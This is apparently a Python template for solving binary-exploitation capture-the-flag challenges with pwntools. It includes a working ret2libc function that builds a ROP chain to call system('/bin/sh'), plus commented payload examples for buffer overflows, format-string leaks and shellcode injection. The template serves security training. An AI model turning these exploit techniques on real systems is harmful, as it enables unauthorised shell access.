#!/usr/bin/env python3
"""
CTF Pwn (Binary Exploitation) Template
=========================================
Domain : Pwn / Binary Exploitation
Usage  : python solve.py [--target HOST:PORT] [--file FILE] [--data DATA]
"""

import argparse
import struct
import re
import os
import sys
import hashlib
import base64

# ── Optional imports (install if needed) ──────────────────────────────
try:
    from pwn import *
except ImportError:
    print("[!] pwntools not installed — run: pip install pwntools")
    sys.exit(1)

try:
    import requests
except ImportError:
    print("[!] requests not installed — run: pip install requests")


# ══════════════════════════════════════════════════════════════════════
# CONFIGURATION — Fill these in during the competition
# ══════════════════════════════════════════════════════════════════════
TARGET_HOST  = ""          # e.g. "challenge.ctf.com"
TARGET_PORT  = 0           # e.g. 9001
BINARY_PATH  = ""          # e.g. "./vuln"
LIBC_PATH    = ""          # e.g. "./libc.so.6"
FLAG_FORMAT  = r"FDC\{.*?\}"

# pwntools settings
context.update(
    arch="amd64",          # "i386" for 32-bit
    os="linux",
    # log_level="debug",   # Uncomment for verbose output
)


# ══════════════════════════════════════════════════════════════════════
# CONNECTION HELPERS
# ══════════════════════════════════════════════════════════════════════
def get_target(args) -> tube:
    """Return a pwntools tube — remote for competition, local for testing."""
    if args.target:
        host, port = args.target.split(":")
        print(f"[*] Connecting to {host}:{port} …")
        return remote(host, int(port))
    elif args.file or BINARY_PATH:
        binary = args.file or BINARY_PATH
        print(f"[*] Launching local process: {binary}")
        return process(binary)
    else:
        print("[!] No target or binary specified.")
        sys.exit(1)


# ══════════════════════════════════════════════════════════════════════
# HELPER FUNCTIONS
# ══════════════════════════════════════════════════════════════════════
def read_file(path: str) -> bytes:
    """Read a local file and return raw bytes."""
    with open(path, "rb") as f:
        return f.read()


def find_offset(binary_path: str) -> int:
    """Use pwntools cyclic to find the crash offset (run manually first)."""
    # 1) Generate pattern:  cyclic(200)
    # 2) Feed to binary, note the crash value from EIP/RIP
    # 3) Find offset:       cyclic_find(0xdeadbeef)
    print("[*] Generate pattern: cyclic(200)")
    print(f"    Pattern: {cyclic(200)[:80]}…")
    print("[*] After crash, call: cyclic_find(<crash_value>)")
    return 0  # Replace with actual offset


def build_rop_chain(elf_path: str) -> ROP:
    """Build a ROP chain from the binary."""
    elf = ELF(elf_path)
    rop = ROP(elf)
    print(f"[+] ROP gadgets loaded from {elf_path}")
    return rop


def leak_address(io: tube, offset: int = None) -> int:
    """Template for leaking a libc/stack address via format string or overflow."""
    # Example: format string leak
    # io.sendline(f"%{offset}$p".encode())
    # leak = int(io.recvline().strip(), 16)
    # print(f"[+] Leaked address: {hex(leak)}")
    # return leak
    pass


def ret2libc(elf_path: str, libc_path: str, leaked_addr: int, leaked_symbol: str):
    """Calculate libc base and build a ret2libc payload."""
    elf = ELF(elf_path)
    libc = ELF(libc_path)

    libc.address = leaked_addr - libc.symbols[leaked_symbol]
    print(f"[+] libc base: {hex(libc.address)}")

    system = libc.symbols["system"]
    bin_sh = next(libc.search(b"/bin/sh\x00"))
    print(f"[+] system:  {hex(system)}")
    print(f"[+] /bin/sh: {hex(bin_sh)}")

    rop = ROP(libc)
    rop.call("system", [bin_sh])
    return rop


def find_flag(text: str) -> list:
    """Extract flags from text using the configured flag format."""
    return re.findall(FLAG_FORMAT, text)


# ══════════════════════════════════════════════════════════════════════
# SOLVE LOGIC — Implement your solution here
# ══════════════════════════════════════════════════════════════════════
def solve(args):
    print("[*] Starting Pwn solve …")

    io = get_target(args)

    # ── Binary analysis (if available) ────────────────────────────────
    binary = args.file or BINARY_PATH
    if binary and os.path.isfile(binary):
        elf = ELF(binary)
        print(f"[+] Binary: {elf.path}")
        print(f"    Arch:   {elf.arch}")
        print(f"    RELRO:  {elf.relro}")
        print(f"    Stack:  {'Canary' if elf.canary else 'No canary'}")
        print(f"    NX:     {'Enabled' if elf.nx else 'Disabled'}")
        print(f"    PIE:    {'Enabled' if elf.pie else 'Disabled'}")

    # ── TODO: Write your exploitation logic below ─────────────────────
    #
    # Example: Buffer overflow with known offset
    #   OFFSET = 72
    #   payload  = b"A" * OFFSET
    #   payload += p64(elf.symbols["win"])   # overwrite return address
    #   io.sendlineafter(b"> ", payload)
    #
    # Example: Format string exploit
    #   io.sendline(b"%7$p")                 # leak canary / address
    #   leak = int(io.recvline(), 16)
    #
    # Example: Shellcode injection (NX disabled)
    #   shellcode = asm(shellcraft.sh())
    #   payload = shellcode + b"\x90" * (OFFSET - len(shellcode)) + p64(buf_addr)
    #   io.sendline(payload)
    #
    # Example: ret2libc
    #   rop_chain = ret2libc(binary, LIBC_PATH, leaked_puts, "puts")
    #   payload = b"A" * OFFSET + rop_chain.chain()
    #

    # ── Receive output & extract flag ─────────────────────────────────
    try:
        output = io.recvall(timeout=5).decode(errors="replace")
        flags = find_flag(output)
        if flags:
            print(f"[+] FLAG: {flags}")
        else:
            print(f"[*] Output:\n{output}")
    except Exception as e:
        print(f"[!] Error receiving output: {e}")
        io.interactive()

    print("[*] Done.")


# ══════════════════════════════════════════════════════════════════════
# ENTRY POINT
# ══════════════════════════════════════════════════════════════════════
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Pwn CTF Solver")
    parser.add_argument("-t", "--target", help="Remote target as HOST:PORT")
    parser.add_argument("-f", "--file",   help="Path to local binary")
    parser.add_argument("-d", "--data",   help="Inline data / payload string")
    args = parser.parse_args()
    solve(args)
